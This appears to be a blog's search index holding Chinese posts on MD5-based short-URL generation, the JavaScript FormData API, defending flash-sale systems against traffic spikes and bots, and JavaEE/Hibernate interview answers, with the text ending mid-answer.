<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[短链生成算法]]></title>
    <url>%2F2018%2F05%2F22%2F%E7%9F%AD%E9%93%BE%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[何为短链短链：即一个较短的链接地址，这个链接地址通常指的是url。 为什么需要短链现而今，互联网无处不在。我们无时无刻都在上网，查看信息，分享信息。而分享信息很多时候都是通过分享链接来实现的，比如说说、日志、群聊等等。一个奇长无比链接分享出来，特别恶心人。以及微博等社交软件发表、分享通常有字数限制。此时，短链需求应运而生。 短链接的好处1、内容需要；2、用户友好；3、便于管理。 为什么要这样做的，原因我想有这样几点： 微博限制字数为140字一条，那么如果我们需要发一些连接上去，但是这个连接非常的长，以至于将近要占用我们内容的一半篇幅，这肯定是不能被允许的，所以短网址应运而生了。短网址可以在我们项目里可以很好的对开放级URL进行管理。有一部分网址可以会涵盖暴力，广告等信息，这样我们可以通过用户的举报，完全管理这个连接将不出现在我们的应用中，应为同样的URL通过加密算法之后，得到的地址是一样的。我们可以对一系列的网址进行流量，点击等统计，挖掘出大多数用户的关注点，这样有利于我们对项目的后续工作更好的作出决策。 短链原理将一个url部分冗长的信息通过哈希算法进行压缩，并建立哈希值与原链之间的映射。每当通过短链访问时，后端服务就通过短链中的哈希值找到对应的原链，然后通过请求转发或者重定向的方式转至原链接内容。 短链算法基于以上原理可知，任何一种哈希算法都可以作为短链生成的算法基础，这里给大家看到的是市面上广泛采用的基于MD5的算法。 代码示例123456789101112131415161718192021222324252627282930313233var md5 = require('./md5').md5;function getLinkShort(base,url)&#123; var key = 'alexis'; var urlhash = md5(key,url); var len = urlhash.length; var charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var shortUrlList = []; //将加密后的串分成4段，每段4字节，对每段进行计算，一共可以生成四组短连接 for (var i = 0; i &lt; 4; i++) &#123; var urlhashPiece = urlhash.substr(i * len / 4, len / 4); //将分段的位与0x3fffffff做位与，0x3fffffff表示二进制数的30个1，即30位以后的加密串都归零 var hex = parseInt(urlhashPiece,16) &amp; 0x3fffffff; //此处需要用到hexdec()将16进制字符串转为10进制数值型，否则运算会不正常 var shortUrl = base; //生成6位短连接 for (var j = 0; j &lt; 6; j++) &#123; //将得到的值与0x0000003d,3d为61，即charset的坐标最大值 shortUrl += charset.charAt(hex &amp; 0x0000003d); //循环完以后将hex右移5位 hex = hex &gt;&gt; 5; &#125; shortUrlList.push(shortUrl); &#125; return shortUrlList;&#125;console.log(getLinkShort('http://t.cn/','http://www.baidu.com')); 运行结果12345[ 'http://t.cn/vDS0KK', 'http://t.cn/vvDCO4', 'http://t.cn/b984CK', 'http://t.cn/ebfzHS' ] 可以看到上面的方法生成了四个短链，可根据需要，采取其中一个作为短链即可。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FormData 对象的使用]]></title>
    <url>%2F2018%2F05%2F10%2FFormData%20%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[通过FormData对象可以组装一组用 XMLHttpRequest发送请求的键/值对。它可以更灵活方便的发送表单数据，因为可以独立于表单使用。如果你把表单的编码类型设置为multipart/form-data ，则通过FormData传输的数据格式和表单通过submit() 方法传输的数据格式相同 如何创建一个FormData对象你可以自己创建一个FormData对象，然后通过调用它的append()方法添加字段，就像这样： 1234567891011121314151617var formData = new FormData();formData.append("username", "Groucho");formData.append("accountnum", 123456); // 数字 123456 会被立即转换成字符串 "123456"// HTML 文件类型input，由用户选择formData.append("userfile", fileInputElement.files[0]);// JavaScript file-like 对象var content = '&lt;a id="a"&gt;&lt;b id="b"&gt;hey!&lt;/b&gt;&lt;/a&gt;'; // 新文件的正文...var blob = new Blob([content], &#123; type: "text/xml"&#125;);formData.append("webmasterfile", blob);var request = new XMLHttpRequest();request.open("POST", "http://foo.com/submitform.php");request.send(formData); 注意：字段 “userfile” 和 “webmasterfile” 都包含一个文件. 字段 “accountnum” 是数字类型，它将被FormData.append()方法转换成字符串类型(FormData 对象的字段类型可以是 Blob, File, 或者 string: 如果它的字段类型不是Blob也不是File，则会被转换成字符串类型。 上面的示例创建了一个FormData实例，包含”username”, “accountnum”, “userfile” 和 “webmasterfile”四个字段，然后使用XMLHttpRequest的send()方法发送表单数据。字段 “webmasterfile” 是 Blob类型。一个 Blob对象表示一个不可变的, 原始数据的类似文件对象。Blob表示的数据不一定是一个JavaScript原生格式。 File 接口基于Blob，继承 blob功能并将其扩展为支持用户系统上的文件。你可以通过 Blob() 构造函数创建一个Blob对象。 通过HTML表单创建FormData对象想要构造一个包含Form表单数据的FormData对象，需要在创建FormData对象时指定表单的元素。 1var formData = new FormData(someFormElement); 示例： 1234var formElement = document.querySelector("form");var request = new XMLHttpRequest();request.open("POST", "submitform.php");request.send(new FormData(formElement)); 你还可以在创建一个包含Form表单数据的FormData对象之后和发送请求之前，附加额外的数据到FormData对象里，像这样： 123456var formElement = document.querySelector("form");var formData = new FormData(formElement);var request = new XMLHttpRequest();request.open("POST", "submitform.php");formData.append("serialnumber", serialNumber++);request.send(formData); 这样你就可以在发送请求之前自由地附加不一定是用户编辑的字段到表单数据里 使用FormData对象上传文件你还可以使用FormData上传文件。使用的时候需要在表单中添加一个文件类型的input：12345678910&lt;form enctype="multipart/form-data" method="post" name="fileinfo"&gt; &lt;label&gt;Your email address:&lt;/label&gt; &lt;input type="email" autocomplete="on" autofocus name="userid" placeholder="email" required size="32" maxlength="64" /&gt;&lt;br /&gt; &lt;label&gt;Custom file label:&lt;/label&gt; &lt;input type="text" name="filelabel" size="12" maxlength="32" /&gt;&lt;br /&gt; &lt;label&gt;File to stash:&lt;/label&gt; &lt;input type="file" name="file" required /&gt; &lt;input type="submit" value="Stash the file!" /&gt;&lt;/form&gt;&lt;div&gt;&lt;/div&gt; 然后使用下面的代码发送请求： 123456789101112131415161718192021var form = document.forms.namedItem("fileinfo");form.addEventListener('submit', function(ev) &#123; var oOutput = document.querySelector("div"), oData = new FormData(form); oData.append("CustomField", "This is some extra data"); var oReq = new XMLHttpRequest(); oReq.open("POST", "stash.php", true); oReq.onload = function(oEvent) &#123; if (oReq.status == 200) &#123; oOutput.innerHTML = "Uploaded!"; &#125; else &#123; oOutput.innerHTML = "Error " + oReq.status + " occurred when trying to upload your file.&lt;br \/&gt;"; &#125; &#125;; oReq.send(oData); ev.preventDefault();&#125;, false); 注意：如果FormData对象是通过表单创建的，则表单中指定的请求方式会被应用到方法open()中 。 你还可以直接向FormData对象附加File或Blob类型的文件，如下所示： 1data.append("myfile", myBlob, "filename.txt"); 使用append()方法时，可以通过第三个可选参数设置发送请求的头 Content-Disposition 指定文件名。如果不指定文件名（或者不支持该参数时），将使用名字“blob”。 如果你设置正确的配置项，你也可以通过jQuery来使用FormData对象： 12345678var fd = new FormData(document.querySelector("form"));fd.append("CustomField", "This is some extra data");$.ajax(&#123; url: "stash.php", type: "POST", data: fd, processData: false, // 不处理数据 contentType: false // 不设置内容类型 通过AJAX提交表单和上传文件可以不使用FormData对象如果你想知道不使用FormData对象的情况下，通过AJAX序列化和提交表单 请点击这里。 相关链接 Using XMLHttpRequest HTMLFormElement Blob Typed Arrays]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>AJAX</tag>
        <tag>FormData</tag>
        <tag>Forms</tag>
        <tag>XMLHttpRequest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web系统大规模并发处理]]></title>
    <url>%2F2018%2F05%2F08%2F%E4%B8%80%E3%80%81%E5%A4%A7%E8%A7%84%E6%A8%A1%E5%B9%B6%E5%8F%91%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%8C%91%E6%88%98%2F</url>
    <content type="text"><![CDATA[大规模并发带来的挑战面对5w每秒的高并发秒杀功能，如果Web系统不做针对性的优化，会轻而易举地陷入到异常状态。我们现在一起来讨论下，优化的思路和方法哈。 1. 请求接口的合理设计 一个秒杀或者抢购页面，通常分为2个部分，一个是静态的HTML等内容，另一个就是参与秒杀的Web后台请求接口。 通常静态HTML等内容，是通过CDN的部署，一般压力不大，核心瓶颈实际上在后台请求接口上。这个后端接口，必须能够支持高并发请求，同时，非常重要的一点，必须尽可能“快”，在最短的时间里返回用户的请求结果。为了实现尽可能快这一点，接口的后端存储使用内存级别的操作会更好一点。仍然直接面向MySQL之类的存储是不合适的，如果有这种复杂业务的需求，都建议采用异步写入。 当然，也有一些秒杀和抢购采用“滞后反馈”，就是说秒杀当下不知道结果，一段时间后才可以从页面中看到用户是否秒杀成功。但是，这种属于“偷懒”行为，同时给用户的体验也不好，容易被用户认为是“暗箱操作”。 2. 高并发的挑战：一定要“快” 我们通常衡量一个Web系统的吞吐率的指标是QPS（Query Per Second，每秒处理请求数），解决每秒数万次的高并发场景，这个指标非常关键。举个例子，我们假设处理一个业务请求平均响应时间为100ms，同时，系统内有20台Apache的Web服务器，配置MaxClients为500个（表示Apache的最大连接数目）。 那么，我们的Web系统的理论峰值QPS为（理想化的计算方式）： 20*500/0.1 = 100000 （10万QPS） 咦？我们的系统似乎很强大，1秒钟可以处理完10万的请求，5w/s的秒杀似乎是“纸老虎”哈。实际情况，当然没有这么理想。在高并发的实际场景下，机器都处于高负载的状态，在这个时候平均响应时间会被大大增加。 就Web服务器而言，Apache打开了越多的连接进程，CPU需要处理的上下文切换也越多，额外增加了CPU的消耗，然后就直接导致平均响应时间增加。因此上述的MaxClient数目，要根据CPU、内存等硬件因素综合考虑，绝对不是越多越好。可以通过Apache自带的abench来测试一下，取一个合适的值。然后，我们选择内存操作级别的存储的Redis，在高并发的状态下，存储的响应时间至关重要。网络带宽虽然也是一个因素，不过，这种请求数据包一般比较小，一般很少成为请求的瓶颈。负载均衡成为系统瓶颈的情况比较少，在这里不做讨论哈。 那么问题来了，假设我们的系统，在5w/s的高并发状态下，平均响应时间从100ms变为250ms（实际情况，甚至更多）： 20*500/0.25 = 40000 （4万QPS） 于是，我们的系统剩下了4w的QPS，面对5w每秒的请求，中间相差了1w。 然后，这才是真正的恶梦开始。举个例子，高速路口，1秒钟来5部车，每秒通过5部车，高速路口运作正常。突然，这个路口1秒钟只能通过4部车，车流量仍然依旧，结果必定出现大塞车。（5条车道忽然变成4条车道的感觉） 同理，某一个秒内，20*500个可用连接进程都在满负荷工作中，却仍然有1万个新来请求，没有连接进程可用，系统陷入到异常状态也是预期之内。 其实在正常的非高并发的业务场景中，也有类似的情况出现，某个业务请求接口出现问题，响应时间极慢，将整个Web请求响应时间拉得很长，逐渐将Web服务器的可用连接数占满，其他正常的业务请求，无连接进程可用。 更可怕的问题是，是用户的行为特点，系统越是不可用，用户的点击越频繁，恶性循环最终导致“雪崩”（其中一台Web机器挂了，导致流量分散到其他正常工作的机器上，再导致正常的机器也挂，然后恶性循环），将整个Web系统拖垮。 3. 重启与过载保护 如果系统发生“雪崩”，贸然重启服务，是无法解决问题的。最常见的现象是，启动起来后，立刻挂掉。这个时候，最好在入口层将流量拒绝，然后再将重启。如果是redis/memcache这种服务也挂了，重启的时候需要注意“预热”，并且很可能需要比较长的时间。 秒杀和抢购的场景，流量往往是超乎我们系统的准备和想象的。这个时候，过载保护是必要的。如果检测到系统满负载状态，拒绝请求也是一种保护措施。在前端设置过滤是最简单的方式，但是，这种做法是被用户“千夫所指”的行为。更合适一点的是，将过载保护设置在CGI入口层，快速将客户的直接请求返回。 作弊的手段：进攻与防守秒杀和抢购收到了“海量”的请求，实际上里面的水分是很大的。不少用户，为了“抢“到商品，会使用“刷票工具”等类型的辅助工具，帮助他们发送尽可能多的请求到服务器。还有一部分高级用户，制作强大的自动请求脚本。这种做法的理由也很简单，就是在参与秒杀和抢购的请求中，自己的请求数目占比越多，成功的概率越高。 这些都是属于“作弊的手段”，不过，有“进攻”就有“防守”，这是一场没有硝烟的战斗哈。 1. 同一个账号，一次性发出多个请求 部分用户通过浏览器的插件或者其他工具，在秒杀开始的时间里，以自己的账号，一次发送上百甚至更多的请求。实际上，这样的用户破坏了秒杀和抢购的公平性。 这种请求在某些没有做数据安全处理的系统里，也可能造成另外一种破坏，导致某些判断条件被绕过。例如一个简单的领取逻辑，先判断用户是否有参与记录，如果没有则领取成功，最后写入到参与记录中。这是个非常简单的逻辑，但是，在高并发的场景下，存在深深的漏洞。多个并发请求通过负载均衡服务器，分配到内网的多台Web服务器，它们首先向存储发送查询请求，然后，在某个请求成功写入参与记录的时间差内，其他的请求获查询到的结果都是“没有参与记录”。这里，就存在逻辑判断被绕过的风险。 应对方案： 在程序入口处，一个账号只允许接受1个请求，其他请求过滤。不仅解决了同一个账号，发送N个请求的问题，还保证了后续的逻辑流程的安全。实现方案，可以通过Redis这种内存缓存服务，写入一个标志位（只允许1个请求写成功，结合watch的乐观锁的特性），成功写入的则可以继续参加。 或者，自己实现一个服务，将同一个账号的请求放入一个队列中，处理完一个，再处理下一个。 2. 多个账号，一次性发送多个请求 很多公司的账号注册功能，在发展早期几乎是没有限制的，很容易就可以注册很多个账号。因此，也导致了出现了一些特殊的工作室，通过编写自动注册脚本，积累了一大批“僵尸账号”，数量庞大，几万甚至几十万的账号不等，专门做各种刷的行为（这就是微博中的“僵尸粉“的来源）。举个例子，例如微博中有转发抽奖的活动，如果我们使用几万个“僵尸号”去混进去转发，这样就可以大大提升我们中奖的概率。 这种账号，使用在秒杀和抢购里，也是同一个道理。例如，iPhone官网的抢购，火车票黄牛党。 应对方案： 这种场景，可以通过检测指定机器IP请求频率就可以解决，如果发现某个IP请求频率很高，可以给它弹出一个验证码或者直接禁止它的请求： 弹出验证码，最核心的追求，就是分辨出真实用户。因此，大家可能经常发现，网站弹出的验证码，有些是“鬼神乱舞”的样子，有时让我们根本无法看清。他们这样做的原因，其实也是为了让验证码的图片不被轻易识别，因为强大的“自动脚本”可以通过图片识别里面的字符，然后让脚本自动填写验证码。实际上，有一些非常创新的验证码，效果会比较好，例如给你一个简单问题让你回答，或者让你完成某些简单操作（例如百度贴吧的验证码）。 直接禁止IP，实际上是有些粗暴的，因为有些真实用户的网络场景恰好是同一出口IP的，可能会有“误伤“。但是这一个做法简单高效，根据实际场景使用可以获得很好的效果。 3. 多个账号，不同IP发送不同请求 所谓道高一尺，魔高一丈。有进攻，就会有防守，永不休止。这些“工作室”，发现你对单机IP请求频率有控制之后，他们也针对这种场景，想出了他们的“新进攻方案”，就是不断改变IP。 有同学会好奇，这些随机IP服务怎么来的。有一些是某些机构自己占据一批独立IP，然后做成一个随机代理IP的服务，有偿提供给这些“工作室”使用。还有一些更为黑暗一点的，就是通过木马黑掉普通用户的电脑，这个木马也不破坏用户电脑的正常运作，只做一件事情，就是转发IP包，普通用户的电脑被变成了IP代理出口。通过这种做法，黑客就拿到了大量的独立IP，然后搭建为随机IP服务，就是为了挣钱。 应对方案： 说实话，这种场景下的请求，和真实用户的行为，已经基本相同了，想做分辨很困难。再做进一步的限制很容易“误伤“真实用户，这个时候，通常只能通过设置业务门槛高来限制这种请求了，或者通过账号行为的”数据挖掘“来提前清理掉它们。 僵尸账号也还是有一些共同特征的，例如账号很可能属于同一个号码段甚至是连号的，活跃度不高，等级低，资料不全等等。根据这些特点，适当设置参与门槛，例如限制参与秒杀的账号等级。通过这些业务手段，也是可以过滤掉一些僵尸号。 4. 火车票的抢购 看到这里，同学们是否明白你为什么抢不到火车票？如果你只是老老实实地去抢票，真的很难。通过多账号的方式，火车票的黄牛将很多车票的名额占据，部分强大的黄牛，在处理验证码方面，更是“技高一筹“。 高级的黄牛刷票时，在识别验证码的时候使用真实的人，中间搭建一个展示验证码图片的中转软件服务，真人浏览图片并填写下真实验证码，返回给中转软件。对于这种方式，验证码的保护限制作用被废除了，目前也没有很好的解决方案。 因为火车票是根据身份证实名制的，这里还有一个火车票的转让操作方式。大致的操作方式，是先用买家的身份证开启一个抢票工具，持续发送请求，黄牛账号选择退票，然后黄牛买家成功通过自己的身份证购票成功。当一列车厢没有票了的时候，是没有很多人盯着看的，况且黄牛们的抢票工具也很强大，即使让我们看见有退票，我们也不一定能抢得过他们哈。 最终，黄牛顺利将火车票转移到买家的身份证下。 解决方案： 并没有很好的解决方案，唯一可以动心思的也许是对账号数据进行“数据挖掘”，这些黄牛账号也是有一些共同特征的，例如经常抢票和退票，节假日异常活跃等等。将它们分析出来，再做进一步处理和甄别。 高并发下的数据安全我们知道在多线程写入同一个文件的时候，会存现“线程安全”的问题（多个线程同时运行同一段代码，如果每次运行结果和单线程运行的结果是一样的，结果和预期相同，就是线程安全的）。如果是MySQL数据库，可以使用它自带的锁机制很好的解决问题，但是，在大规模并发的场景中，是不推荐使用MySQL的。秒杀和抢购的场景中，还有另外一个问题，就是“超发”，如果在这方面控制不慎，会产生发送过多的情况。我们也曾经听说过，某些电商搞抢购活动，买家成功拍下后，商家却不承认订单有效，拒绝发货。这里的问题，也许并不一定是商家奸诈，而是系统技术层面存在超发风险导致的。 1. 超发的原因 假设某个抢购场景中，我们一共只有100个商品，在最后一刻，我们已经消耗了99个商品，仅剩最后一个。这个时候，系统发来多个并发请求，这批请求读取到的商品余量都是99个，然后都通过了这一个余量判断，最终导致超发。（同文章前面说的场景） 在上面的这个图中，就导致了并发用户B也“抢购成功”，多让一个人获得了商品。这种场景，在高并发的情况下非常容易出现。 2. 悲观锁思路 解决线程安全的思路很多，可以从“悲观锁”的方向开始讨论。 悲观锁，也就是在修改数据的时候，采用锁定状态，排斥外部请求的修改。遇到加锁的状态，就必须等待。 虽然上述的方案的确解决了线程安全的问题，但是，别忘记，我们的场景是“高并发”。也就是说，会很多这样的修改请求，每个请求都需要等待“锁”，某些线程可能永远都没有机会抢到这个“锁”，这种请求就会死在那里。同时，这种请求会很多，瞬间增大系统的平均响应时间，结果是可用连接数被耗尽，系统陷入异常。 3. FIFO队列思路 那好，那么我们稍微修改一下上面的场景，我们直接将请求放入队列中的，采用FIFO（First Input First Output，先进先出），这样的话，我们就不会导致某些请求永远获取不到锁。看到这里，是不是有点强行将多线程变成单线程的感觉哈。 然后，我们现在解决了锁的问题，全部请求采用“先进先出”的队列方式来处理。那么新的问题来了，高并发的场景下，因为请求很多，很可能一瞬间将队列内存“撑爆”，然后系统又陷入到了异常状态。或者设计一个极大的内存队列，也是一种方案，但是，系统处理完一个队列内请求的速度根本无法和疯狂涌入队列中的数目相比。也就是说，队列内的请求会越积累越多，最终Web系统平均响应时候还是会大幅下降，系统还是陷入异常。 4. 乐观锁思路 这个时候，我们就可以讨论一下“乐观锁”的思路了。乐观锁，是相对于“悲观锁”采用更为宽松的加锁机制，大都是采用带版本号（Version）更新。实现就是，这个数据所有请求都有资格去修改，但会获得一个该数据的版本号，只有版本号符合的才能更新成功，其他的返回抢购失败。这样的话，我们就不需要考虑队列的问题，不过，它会增大CPU的计算开销。但是，综合来说，这是一个比较好的解决方案。 有很多软件和服务都“乐观锁”功能的支持，例如Redis中的watch就是其中之一。通过这个实现，我们保证了数据的安全。 小结互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。电商秒杀和抢购，是两个比较典型的互联网高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。]]></content>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaEE面试题]]></title>
    <url>%2F2018%2F05%2F02%2FJavaEE%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[SpringMVC的请求流程？spring的MVC执行原理 1.spring mvc将所有的请求都提交给DispatcherServlet,它会委托应用系统的其他模块负责对请求 进行真正的处理工作。2.DispatcherServlet查询一个或多个HandlerMapping,找到处理请求的Controller.3.DispatcherServlet请请求提交到目标Controller4.Controller进行业务逻辑处理后，会返回一个ModelAndView5.Dispathcher查询一个或多个ViewResolver视图解析器,找到ModelAndView对象指定的视图对象6.视图对象负责渲染返回给客户端。 优点： 1.使用Spring的IOC容器，将对象之间的依赖关系交给Spring，降低组件之间的耦合性，让我们更专注于应用逻辑 2.可以提供众多服务，事务管理，WS等。 3.AOP的很好支持，方便面向切面编程。 4.对主流的框架提供了很好的集成支持，如Hibernate,Struts2,JPA等 5.Spring DI机制降低了业务对象替换的复杂性。 6.Spring属于低侵入，代码污染极低。 7.Spring的高度可开放性，并不强制依赖于Spring，开发者可以自由选择Spring部分或全部 用户发起请求到前端控制器（Controller） 前端控制器没有处理业务逻辑的能力，需要找到具体的模型对象处理（Handler）,到处理映射器（HandlerMapping）中查找Handler对象（Model） HandlerMapping返回执行链，包装了2部分内容： ① Handler对象②拦截器数组 前端处理器通过处理器适配器包装后执行Handler对象 处理业务逻辑 Handler处理完业务逻辑，返回ModelAndView对象，其中View是视图名称，不是真正的视图对象。 将ModelAndView返回给前端控制器 视图解析器（ViewResolver）返回真正的视图对象（View） (此时前端控制器中既有视图又有Model对象)前端控制器根据模型数据和视图对象，进行视图渲染。 返回渲染后的视图（html/json/xml）返回。 给用户响应 什么是ORM？答：对象关系映射（Object-Relational Mapping，简称ORM）是一种为了解决程序的面向对象模型与数据库的关系模型互不匹配问题的技术；简单的说，ORM是通过使用描述对象和数据库之间映射的元数据（在Java中可以用XML或者是注解），将程序中的对象自动持久化到关系数据库中或者将关系数据库表中的行转换成Java对象，其本质上就是将数据从一种形式转换到另外一种形式。 持久层设计要考虑的问题有哪些？你用过的持久层框架有哪些？答：所谓”持久”就是将数据保存到可掉电式存储设备中以便今后使用，简单的说，就是将内存中的数据保存到关系型数据库、文件系统、消息队列等提供持久化支持的设备中。持久层就是系统中专注于实现数据持久化的相对独立的层面。 持久层设计的目标包括： 数据存储逻辑的分离，提供抽象化的数据访问接口。 数据访问底层实现的分离，可以在不修改代码的情况下切换底层实现。 资源管理和调度的分离，在数据访问层实现统一的资源调度（如缓存机制）。 数据抽象，提供更面向对象的数据操作。 持久层框架有： Hibernate MyBatis TopLink Guzz jOOQ Spring Data ActiveJDBC Hibernate中SessionFactory是线程安全的吗？Session是线程安全的吗（两个线程能够共享同一个Session吗）？答：SessionFactory对应Hibernate的一个数据存储的概念，它是线程安全的，可以被多个线程并发访问。SessionFactory一般只会在启动的时候构建。对于应用程序，最好将SessionFactory通过单例模式进行封装以便于访问。Session是一个轻量级非线程安全的对象（线程间不能共享session），它表示与数据库进行交互的一个工作单元。Session是由SessionFactory创建的，在任务完成之后它会被关闭。Session是持久层服务对外提供的主要接口。Session会延迟获取数据库连接（也就是在需要的时候才会获取）。为了避免创建太多的session，可以使用ThreadLocal将session和当前线程绑定在一起，这样可以让同一个线程获得的总是同一个session。Hibernate 3中SessionFactory的getCurrentSession()方法就可以做到。 129、Hibernate中Session的load和get方法的区别是什么？答：主要有以下三项区别：① 如果没有找到符合条件的记录，get方法返回null，load方法抛出异常。② get方法直接返回实体类对象，load方法返回实体类对象的代理。③ 在Hibernate 3之前，get方法只在一级缓存中进行数据查找，如果没有找到对应的数据则越过二级缓存，直接发出SQL语句完成数据读取；load方法则可以从二级缓存中获取数据；从Hibernate 3开始，get方法不再是对二级缓存只写不读，它也是可以访问二级缓存的。 说明：对于load()方法Hibernate认为该数据在数据库中一定存在可以放心的使用代理来实现延迟加载，如果没有数据就抛出异常，而通过get()方法获取的数据可以不存在。 Session的save()、update()、merge()、lock()、saveOrUpdate()和persist()方法分别是做什么的？有什么区别？答：Hibernate的对象有三种状态：瞬时态（transient）、持久态（persistent）和游离态（detached），如第135题中的图所示。瞬时态的实例可以通过调用save()、persist()或者saveOrUpdate()方法变成持久态；游离态的实例可以通过调用 update()、saveOrUpdate()、lock()或者replicate()变成持久态。save()和persist()将会引发SQL的INSERT语句，而update()或merge()会引发UPDATE语句。save()和update()的区别在于一个是将瞬时态对象变成持久态，一个是将游离态对象变为持久态。merge()方法可以完成save()和update()方法的功能，它的意图是将新的状态合并到已有的持久化对象上或创建新的持久化对象。对于persist()方法，按照官方文档的说明：① persist()方法把一个瞬时态的实例持久化，但是并不保证标识符被立刻填入到持久化实例中，标识符的填入可能被推迟到flush的时间；② persist()方法保证当它在一个事务外部被调用的时候并不触发一个INSERT语句，当需要封装一个长会话流程的时候，persist()方法是很有必要的；③ save()方法不保证第②条，它要返回标识符，所以它会立即执行INSERT语句，不管是在事务内部还是外部。至于lock()方法和update()方法的区别，update()方法是把一个已经更改过的脱管状态的对象变成持久状态；lock()方法是把一个没有更改过的脱管状态的对象变成持久状态。 阐述Session加载实体对象的过程。答：Session加载实体对象的步骤是：① Session在调用数据库查询功能之前，首先会在一级缓存中通过实体类型和主键进行查找，如果一级缓存查找命中且数据状态合法，则直接返回；② 如果一级缓存没有命中，接下来Session会在当前NonExists记录（相当于一个查询黑名单，如果出现重复的无效查询可以迅速做出判断，从而提升性能）中进行查找，如果NonExists中存在同样的查询条件，则返回null；③ 如果一级缓存查询失败则查询二级缓存，如果二级缓存命中则直接返回；④ 如果之前的查询都未命中，则发出SQL语句，如果查询未发现对应记录则将此次查询添加到Session的NonExists中加以记录，并返回null；⑤ 根据映射配置和SQL语句得到ResultSet，并创建对应的实体对象；⑥ 将对象纳入Session（一级缓存）的管理；⑦ 如果有对应的拦截器，则执行拦截器的onLoad方法；⑧ 如果开启并设置了要使用二级缓存，则将数据对象纳入二级缓存；⑨ 返回数据对象。 Query接口的list方法和iterate方法有什么区别？答：① list()方法无法利用一级缓存和二级缓存（对缓存只写不读），它只能在开启查询缓存的前提下使用查询缓存；iterate()方法可以充分利用缓存，如果目标数据只读或者读取频繁，使用iterate()方法可以减少性能开销。② list()方法不会引起N+1查询问题，而iterate()方法可能引起N+1查询问题 说明：关于N+1查询问题，可以参考CSDN上的一篇文章《什么是N+1查询》 Hibernate如何实现分页查询？答：通过Hibernate实现分页查询，开发人员只需要提供HQL语句（调用Session的createQuery()方法）或查询条件（调用Session的createCriteria()方法）、设置查询起始行数（调用Query或Criteria接口的setFirstResult()方法）和最大查询行数（调用Query或Criteria接口的setMaxResults()方法），并调用Query或Criteria接口的list()方法，Hibernate会自动生成分页查询的SQL语句。 锁机制有什么用？简述Hibernate的悲观锁和乐观锁机制。答：有些业务逻辑在执行过程中要求对数据进行排他性的访问，于是需要通过一些机制保证在此过程中数据被锁住不会被外界修改，这就是所谓的锁机制。Hibernate支持悲观锁和乐观锁两种锁机制。悲观锁，顾名思义悲观的认为在数据处理过程中极有可能存在修改数据的并发事务（包括本系统的其他事务或来自外部系统的事务），于是将处理的数据设置为锁定状态。悲观锁必须依赖数据库本身的锁机制才能真正保证数据访问的排他性，关于数据库的锁机制和事务隔离级别在《Java面试题大全（上）》中已经讨论过了。乐观锁，顾名思义，对并发事务持乐观态度（认为对数据的并发操作不会经常性的发生），通过更加宽松的锁机制来解决由于悲观锁排他性的数据访问对系统性能造成的严重影响。最常见的乐观锁是通过数据版本标识来实现的，读取数据时获得数据的版本号，更新数据时将此版本号加1，然后和数据库表对应记录的当前版本号进行比较，如果提交的数据版本号大于数据库中此记录的当前版本号则更新数据，否则认为是过期数据无法更新。Hibernate中通过Session的get()和load()方法从数据库中加载对象时可以通过参数指定使用悲观锁；而乐观锁可以通过给实体类加整型的版本字段再通过XML或@Version注解进行配置。 提示：使用乐观锁会增加了一个版本字段，很明显这需要额外的空间来存储这个版本字段，浪费了空间，但是乐观锁会让系统具有更好的并发性，这是对时间的节省。因此乐观锁也是典型的空间换时间的策略。 阐述实体对象的三种状态以及转换关系。答：最新的Hibernate文档中为Hibernate对象定义了四种状态（原来是三种状态，面试的时候基本上问的也是三种状态），分别是：瞬时态（new, or transient）、持久态（managed, or persistent）、游状态（detached）和移除态（removed，以前Hibernate文档中定义的三种状态中没有移除态），如下图所示，就以前的Hibernate文档中移除态被视为是瞬时态。 瞬时态：当new一个实体对象后，这个对象处于瞬时态，即这个对象只是一个保存临时数据的内存区域，如果没有变量引用这个对象，则会被JVM的垃圾回收机制回收。这个对象所保存的数据与数据库没有任何关系，除非通过Session的save()、saveOrUpdate()、persist()、merge()方法把瞬时态对象与数据库关联，并把数据插入或者更新到数据库，这个对象才转换为持久态对象。 持久态：持久态对象的实例在数据库中有对应的记录，并拥有一个持久化标识（ID）。对持久态对象进行delete操作后，数据库中对应的记录将被删除，那么持久态对象与数据库记录不再存在对应关系，持久态对象变成移除态（可以视为瞬时态）。持久态对象被修改变更后，不会马上同步到数据库，直到数据库事务提交。 游离态：当Session进行了close()、clear()、evict()或flush()后，实体对象从持久态变成游离态，对象虽然拥有持久和与数据库对应记录一致的标识值，但是因为对象已经从会话中清除掉，对象不在持久化管理之内，所以处于游离态（也叫脱管态）。游离态的对象与临时状态对象是十分相似的，只是它还含有持久化标识。 提示：关于这个问题，在Hibernate的官方文档中有更为详细的解读。 如何理解Hibernate的延迟加载机制？在实际应用中，延迟加载与Session关闭的矛盾是如何处理的？答：延迟加载就是并不是在读取的时候就把数据加载进来，而是等到使用时再加载。Hibernate使用了虚拟代理机制实现延迟加载，我们使用Session的load()方法加载数据或者一对多关联映射在使用延迟加载的情况下从一的一方加载多的一方，得到的都是虚拟代理，简单的说返回给用户的并不是实体本身，而是实体对象的代理。代理对象在用户调用getter方法时才会去数据库加载数据。但加载数据就需要数据库连接。而当我们把会话关闭时，数据库连接就同时关闭了。 延迟加载与session关闭的矛盾一般可以这样处理：① 关闭延迟加载特性。这种方式操作起来比较简单，因为Hibernate的延迟加载特性是可以通过映射文件或者注解进行配置的，但这种解决方案存在明显的缺陷。首先，出现”no session or session was closed”通常说明系统中已经存在主外键关联，如果去掉延迟加载的话，每次查询的开销都会变得很大。② 